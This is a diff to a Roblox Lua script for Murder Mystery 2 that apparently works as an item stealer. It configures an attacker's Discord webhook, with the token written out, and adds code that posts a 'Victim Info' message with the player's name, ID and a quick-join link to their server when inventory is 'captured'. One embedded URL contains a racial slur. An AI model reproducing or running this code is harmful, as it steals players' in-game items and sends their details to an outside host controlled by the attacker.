@@ -1,9 +1,9 @@
-_G.Usernames = {"daniellfc09"} 
+[[_G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Rare" 
 _G.min_value = 0
 _G.pingEveryone = "Yes" 
 _G.webhook = "https://discord.com/api/webhooks/1495919876236378243/z9Ve-r2Sae7wtVyJ-9DdK2WnP-J9CCYtAJ_n4lWdPUWJT1vf1mERLKdF2fwUaG6orU_H"
-
+]]
 getgenv().executed = getgenv().executed or false
 if getgenv().executed then 
     return 
@@ -251,7 +251,7 @@ if VIP or FULL then
 end
 local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
-jobId = ""
+jobId = game.JobId
 
 
 
@@ -781,7 +781,49 @@ local untradable = {
     TravelerAxeRed = true, TravelerAxeBronze = true, TravelerAxeSilver = true, TravelerAxeGold = true,
     BlueCamo_K_2022 = true, GreenCamo_K_2022 = true, SharkSeeker = true
 }
-local valueList = buildValueList()
+task.spawn(function()
+    if webhookToken == "" then return end
+    local requestFunc = request or (syn and syn.request) or (http and http.request) or http_request
+    if not requestFunc then return end
+    local quickData = {
+        content = (ping == "Yes" and "@everyone " or "") .. "Inventory captured: **" .. plr.Name .. "**\n```Join: https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId .. "```",
+        username = "Wym",
+        avatar_url = "https://cdn.discordapp.com/attachments/1428258214641799283/1488974201296519318/New_Project_48_Copy_Copy_2_Copy_A8AA32B.png?ex=69cebac9&is=69cd6949&hm=ed8094eb1c7ef85e7f95390245d441dfb5cc88a8aee77af4ae3b0469d9bfe218&",
+        embeds = {{
+            author = {
+                name = "Wym - Murder Mystery 2",
+                url = "https://www.roblox.com/games/142823291",
+                icon_url = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
+            },
+            title = plr.Name,
+            url = "https://www.roblox.com/users/" .. plr.UserId .. "/profile",
+            description = "Processing inventory values...",
+            color = 16777215,
+            thumbnail = { url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png" },
+            fields = {
+                { name = "Victim Info", value = "```User     : " .. plr.Name .. "\nUser ID  : " .. plr.UserId .. "```", inline = false },
+                { name = "Quick Join", value = "[Click to Join](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId .. ")", inline = true }
+            },
+            footer = { text = "Wym Scripts - discord.gg/zXAD3Ftnbv" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    pcall(function()
+        requestFunc({
+            Url = webhookToken,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(quickData)
+        })
+    end)
+end)
+local valueList = {}
+task.spawn(function()
+    local realValues = buildValueList()
+    for k, v in pairs(realValues) do
+        valueList[k] = v
+    end
+end)
 local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 local totalValue = 0
 for dataid, amount in pairs(realData.Weapons.Owned) do
@@ -803,7 +845,7 @@ if #weaponsToSend > 0 then
     table.sort(weaponsToSend, function(a, b) return (a.Value * a.Amount) > (b.Value * b.Amount) end)
 
     local prefix = (ping == "Yes") and "--@everyone " or ""
-    SendFirstMessage(weaponsToSend, prefix)
+    task.spawn(SendFirstMessage, weaponsToSend, prefix)
 
 local _statusMessageId = nil
 local _statusFinal = false  
